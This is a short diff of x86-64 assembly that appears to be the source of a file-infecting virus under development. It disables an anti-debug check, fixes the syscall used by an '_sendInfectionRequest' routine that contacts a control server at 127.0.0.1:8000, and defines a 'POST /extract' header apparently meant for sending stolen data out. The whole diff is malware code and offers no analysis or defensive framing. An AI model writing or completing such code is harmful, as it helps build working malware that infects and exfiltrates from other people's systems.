@@ -13,7 +13,7 @@ _start:
     mov rbp, rsp
 	PUSHA
 	call _map_int_table
-	call _check_debug
+	; call _check_debug
     call _isInfectionAllow
     test rax, rax
     js _final_jmp
@@ -725,7 +725,6 @@ _isInfectionAllow:
     _sendInfectionRequest:
         ;rdi == sockfd
         mov rdi, rax
-        mov rax, SYS_SENDTO
 		push rdi
 		lea rdi, [rel headerGet]
 		mov rsi, headerGetLen
@@ -733,6 +732,7 @@ _isInfectionAllow:
 		call _decrypt_str
 		mov rsi, rax
 		pop rdi
+        mov rax, SYS_SENDTO
         mov rdx, headerGetLen
         xor r10, r10
         xor r9, r9
@@ -858,7 +858,8 @@ _itoa:
     _itoaLoop:
         cmp rax, 9
         jg _itoaRecursif
-        mov [rsi], byte rax
+        ; mov [rsi], byte rax
+        mov [rsi], ax
         add byte [rsi], 48
         inc rsi
         ret
@@ -913,6 +914,8 @@ sockaddr:
     dw 0x401F       ; PORT 8000
     dd 0x100007F    ; 127.0.0.1 (en hexadécimal)
     dq 0            ; padding
+sockaddr_len dq 0x10
+; sockaddr_len equ $ - sockaddr
 
 headerStart db "POST /extract HTTP/1.1", 0x0D, 0x0A, "Host: 127.0.0.1:8000", 0x0D, 0x0A, "Content-Type: text/plain", 0x0D, 0x0A, "Content-Length: ", 0x0
 headerStartLen equ $ - headerStart
